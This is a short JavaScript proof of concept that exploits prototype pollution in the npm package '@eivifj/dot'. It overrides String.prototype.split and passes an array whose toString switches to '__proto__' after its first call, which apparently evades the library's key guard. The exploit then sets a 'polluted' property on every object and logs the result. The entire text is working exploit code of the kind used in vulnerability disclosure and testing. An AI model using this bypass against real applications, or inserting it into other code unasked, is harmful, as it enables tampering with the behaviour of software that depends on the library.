var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const a = require('@eivifj/dot');
const path = '__proto__.polluted';
console.log({}.polluted);
a.set({}, path, 'yes');
console.log({}.polluted);